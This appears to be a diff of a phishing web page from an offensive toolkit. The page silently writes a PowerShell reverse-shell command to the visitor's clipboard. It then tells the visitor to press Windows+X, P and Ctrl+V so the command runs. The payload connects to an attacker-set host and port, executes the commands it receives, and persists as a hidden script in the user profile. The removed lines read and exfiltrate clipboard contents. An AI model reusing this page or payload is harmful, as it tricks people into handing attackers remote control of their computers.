@@ -1,45 +1,14 @@
 <HTML>
 <meta http-equiv="content-type" content="text/html;charset=utf-8" />
-<meta http-equiv="refresh" content="5">
 <HEAD>
 </HEAD>
 <BODY>
 <?php
 include 'ip.php';
 ?>
-<h3 id="command">Accept permission to continue</h3>
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<h3>Press "Windows+x", then "p" and "Ctrl + v";</h3>
 <script>
-
-function post(dataclip){
-$.ajax({
-    type: 'POST',
-    data: { cat: dataclip
-        },
-    url: '/post.php',
-    dataType: 'json',
-    async: false,
-
-    success: function(result){
-        // call the function that handles the response/results
-
-    },
-
-    error: function(){
-
-    }
-  });
-};
-function granted(text) {
-
-post(text);
 navigator.clipboard.writeText('echo $client = New-Object System.Net.Sockets.TCPClient("server_tcp",server_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535^|%{0};while(($i ^= $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data ^= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback ^= (iex $data 2^>^&1 ^| Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() > %USERPROFILE%\\rs.ps1 & start /b /min powershell -NoExit -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\rs.ps1\n');
-document.getElementById("command").innerHTML = "Press \"Windows+x\", then \"p\" and \"Ctrl + v\"";
-window.stop();
-}
-
-navigator.clipboard.readText().then(text => granted(text));
-</script>
-
+</script> 
 </BODY>
 </HTML>
